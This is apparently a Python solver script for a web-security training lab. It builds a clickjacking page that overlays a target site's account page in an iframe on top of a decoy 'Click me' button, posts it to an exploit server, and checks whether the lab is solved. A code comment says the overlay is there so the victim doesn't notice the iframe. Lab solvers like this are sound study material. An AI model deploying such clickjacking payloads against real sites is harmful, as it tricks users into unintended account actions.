import sys
import logging
import urllib3

import requests

from utils import utils
from utils.blog import Blog

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] {levelname} {name}: {message}",
    style="{",
    datefmt="%H:%M:%S",    
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main(args):
    blog = Blog(args.url, args.no_proxy)
    payload = f"""
    <html>
<head>
    <style>
        #target_website {{
            position: relative;
            width: 800px;
            height: 600px;
            opacity: 0.8;   //reduczir opacidade para o user nao perceber que tem um iframe por baixo
            z-index: 2;
        }}
        #decoy_website {{
            position: absolute;
            width: 300px;
            height: 400px;
            z-index: 1;
            top: 505px;  
            left: 50px;
        }}
    </style>
</head>

<body>
    
    <div id="decoy_website">
        <button class="button" type="submit"> Click me </button>
    </div>
    
    <iframe id="target_website" src="{blog.base_url}my-account">
    </iframe>

</body>
</html>
    """
    blog.post_exploit(response_body=payload)
    blog.is_solved()

if __name__ == "__main__":
    args= utils.parse_args(sys.argv)
    main(args)
